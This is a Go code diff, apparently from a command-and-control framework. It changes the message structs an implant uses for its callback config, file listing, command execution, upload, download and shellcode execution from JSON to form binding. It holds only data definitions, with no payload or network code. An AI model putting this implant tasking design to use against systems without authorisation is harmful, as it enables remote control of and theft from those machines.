@@ -39,10 +39,7 @@ var MessageTypeToStruct = map[int]func() interface{}{
 	IMPLANT_KILL_RESP:     func() interface{} { return &ImplantKillResp{} },
 	IMPLANT_CONFIG_REQ:    func() interface{} { return &ImplantConfigReq{} },
 	IMPLANT_CONFIG_RESP:   func() interface{} { return &ImplantConfigResp{} },
-	//...
-	//reserved for implant functionality
 
-	//modules start
 	FILE_INFO_REQ:       func() interface{} { return &FileInfoReq{} },
 	FILE_INFO_RESP:      func() interface{} { return &FileInfoResp{} },
 	LS_REQ:              func() interface{} { return &LsReq{} },
@@ -126,10 +123,10 @@ func (t *ImplantKillResp) SetTaskId(id string) {
 
 type ImplantConfigReq struct {
 	TaskId           string
-	ServerIp         string `json:"ServerIp"`
-	ServerPort       int    `json:"ServerPort"`
-	CallbackInterval int    `json:"CallbackInterval"`
-	CallbackJitter   int    `json:"CallbackJitter"`
+	ServerIp         string `form:"ServerIp"`
+	ServerPort       int    `form:"ServerPort"`
+	CallbackInterval int    `form:"CallbackInterval"`
+	CallbackJitter   int    `form:"CallbackJitter"`
 }
 
 func (t *ImplantConfigReq) SetTaskId(id string) {
@@ -147,7 +144,7 @@ func (t *ImplantConfigResp) SetTaskId(id string) {
 
 type FileInfoReq struct {
 	TaskId     string
-	PathToFile string `json:"PathToFile" binding:"required"`
+	PathToFile string `form:"PathToFile" binding:"required"`
 }
 
 func (t *FileInfoReq) SetTaskId(id string) {
@@ -169,7 +166,7 @@ func (t *FileInfoResp) SetTaskId(id string) {
 
 type LsReq struct {
 	TaskId string
-	Path   string `json:"Path" binding:"required"`
+	Path   string `form:"Path" binding:"required"`
 }
 
 func (t *LsReq) SetTaskId(id string) {
@@ -187,8 +184,8 @@ func (t *LsResp) SetTaskId(id string) {
 
 type ExecReq struct {
 	TaskId string
-	Cmd    string   `json:"Cmd" binding:"required"`
-	Args   []string `json:"Args"`
+	Cmd    string   `form:"Cmd" binding:"required"`
+	Args   []string `form:"Args"`
 }
 
 func (t *ExecReq) SetTaskId(id string) {
@@ -206,7 +203,7 @@ func (t *ExecResp) SetTaskId(id string) {
 
 type CdReq struct {
 	TaskId string
-	Path   string `json:"Path" binding:"required"`
+	Path   string `form:"Path" binding:"required"`
 }
 
 func (t *CdReq) SetTaskId(id string) {
@@ -224,8 +221,8 @@ func (t *CdResp) SetTaskId(id string) {
 
 type DownloadReq struct {
 	TaskId      string
-	Origin      string `json:"Origin" binding:"required"`
-	Destination string `json:"Destination"`
+	Origin      string `form:"Origin" binding:"required"`
+	Destination string `form:"Destination" binding:"required"`
 }
 
 func (t *DownloadReq) SetTaskId(id string) {
@@ -243,8 +240,8 @@ func (t *DownloadResp) SetTaskId(id string) {
 
 type UploadReq struct {
 	TaskId      string
-	File        []byte `json:"File" binding:"required"`
-	Destination string `json:"Destination"`
+	File        []byte `form:"File" binding:"required"`
+	Destination string `form:"Destination" binding:"required"`
 }
 
 func (t *UploadReq) SetTaskId(id string) {
@@ -262,7 +259,7 @@ func (t *UploadResp) SetTaskId(id string) {
 
 type ShellcodeExecReq struct {
 	TaskId    string
-	Shellcode []byte `json:"Shellcode" binding:"required"`
+	Shellcode []byte `form:"Shellcode" binding:"required"`
 }
 
 func (t *ShellcodeExecReq) SetTaskId(id string) {
